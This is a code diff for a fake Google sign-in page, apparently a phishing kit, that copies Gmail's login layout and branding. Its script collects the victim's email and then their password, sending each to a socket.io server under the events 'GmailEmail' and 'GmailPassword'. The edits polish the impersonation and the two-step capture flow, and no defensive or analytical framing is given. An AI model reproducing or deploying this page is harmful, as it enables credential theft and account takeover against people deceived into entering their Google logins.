@@ -11,8 +11,8 @@
 
 	</head>
 	<body>
-
-		<center><div class="base">
+		
+		<div class="base">
 			<div id="logo">
 				<img src="logo.png" width="118" height="38" />
 			</div>
@@ -20,29 +20,35 @@
 				One account. All of Google.
 			</div>
 			<div id="info2">
-				Sign in to continue to Gmail
+				<center>Sign in to your Google account</center>
 			</div>
 			<div id="form1">
 				<div id="form-img">
 				<img src="profile-img.png" width="99" height="99" />
 				</div>
-				
+				<center>
+				<div id="form-username" style="display:none">
+					
+				</div>
+				</center>
+				</div>
 				<div id="mailbox">
 					<input id="email-textbox" placeholder="Enter your email" type="mail" name="name" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" onKeydown="javascript: if (event.keyCode==13) submit();" />
 				</div>
 				<div>
 				   <input type="button" id="button2" value="Next" onclick="submit()" />
 				</div>
-				
+				<div id="info3container">
 				<div id="info3">
-				    <a href="#"/>Need help?</a>
-			    </div>
+						<a href="#"/>Need help?</a>
+					</div>
+				</div>
 			</div>
 			<div id="info4">
-				    <a href="#"/>Create account</a>
+				    <center><a href="#"/>Create account</a></center>
 			</div>
 			<div id="info5">
-				    One Google Account for everything Google
+				    <center>One Google Account for everything Google</center>
 			</div>
 			<div>
 			    <img src="footer-logo.png" id="logo2" />
@@ -51,7 +57,7 @@
 			
 		
 		</div>
-		</center>
+	
 	</body>
 	
 </html>
@@ -64,14 +70,18 @@ var socket = io.connect();
 
 		if ($('#email-textbox').val().length <= 5){
 		console.log("small")
-		
+
 	}else{
-		console.log("bigger")
+		var username = $('#email-textbox').val();
+		console.log(username)
+		document.getElementById("form-username").innerHTML = username;
 		$('#email-textbox').attr("placeholder", 'Enter Your Password')
 		$('#email-textbox').attr("type", "password")
 		$('#email-textbox').attr("placeholder", 'Enter Your Password')
 		$('#button2').attr("onclick", "submit2()")
 		$('#email-textbox').attr("onkeydown", "javascript: if (event.keyCode==13) submit2()")
+		$('#form-username').attr("style", "display:block")
+		
 		var socket = io();
 
 		  socket.emit('GmailEmail', $('#email-textbox').val());
@@ -85,10 +95,6 @@ var socket = io.connect();
 		console.log("small")
 	}else{
 		socket.emit('GmailPassword', $('#email-textbox').val());
-
-
-
-
 	}
 }
 	
